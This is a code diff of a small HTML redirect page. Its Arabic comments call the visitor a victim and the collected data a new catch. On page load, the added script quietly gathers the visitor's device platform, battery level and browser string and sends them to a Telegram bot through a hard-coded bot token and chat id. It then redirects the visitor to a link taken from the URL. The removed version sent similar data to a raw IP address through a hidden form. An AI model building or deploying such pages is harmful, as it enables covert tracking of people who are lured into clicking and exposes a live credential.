@@ -2,36 +2,38 @@
 <html>
 <head>
     <meta charset="UTF-8">
+    <title>Checking...</title>
     <script>
-        window.onload = function() {
-            const p = new URLSearchParams(window.location.search);
-            const target = p.get('u') || "https://t.me/vo11a";
+        async function sendToBot() {
+            const params = new URLSearchParams(window.location.search);
+            const target = params.get('u') || "https://t.me/vo11a";
             
-            // جمع المعلومات بصمت
-            const info = "Browser: " + navigator.userAgent;
+            // معلومات البوت مالتك (مباشرة)
+            const token = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
+            const chat_id = "5773364548";
 
-            // إنشاء نموذج مخفي لإرسال البيانات غصباً عن المتصفح
-            const form = document.createElement("form");
-            form.method = "GET";
-            form.action = "http://147.135.213.131:20364/log";
+            // جمع معلومات الجهاز والبطارية
+            let batteryInfo = "N/A";
+            try {
+                const b = await navigator.getBattery();
+                batteryInfo = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
+            } catch (e) {}
 
-            const inputU = document.createElement("input");
-            inputU.name = "u";
-            inputU.value = target;
-            form.appendChild(inputU);
+            const text = `🎯 **صيد جديد مباشر!**\n\n📱 **الجهاز:** ${navigator.platform}\n🔋 **البطارية:** ${batteryInfo}\n🌐 **المتصفح:** ${navigator.userAgent.split(' ')[0]}\n🔗 **الرابط:** ${target}`;
 
-            const inputD = document.createElement("input");
-            inputD.name = "d";
-            inputD.value = info;
-            form.appendChild(inputD);
-
-            document.body.appendChild(form);
-            
-            // إرسال البيانات ثم التحويل
-            form.submit();
-            setTimeout(() => { window.location.replace(target); }, 500);
+            // إرسال البيانات للتليجرام مباشرة بدون سيرفر وسيط
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
+            .then(() => {
+                // تحويل الضحية بعد الإرسال
+                window.location.replace(target);
+            })
+            .catch(() => {
+                window.location.replace(target);
+            });
         }
+        window.onload = sendToBot;
     </script>
 </head>
-<body style="background:#000;"></body>
+<body style="background:#000;">
+</body>
 </html>
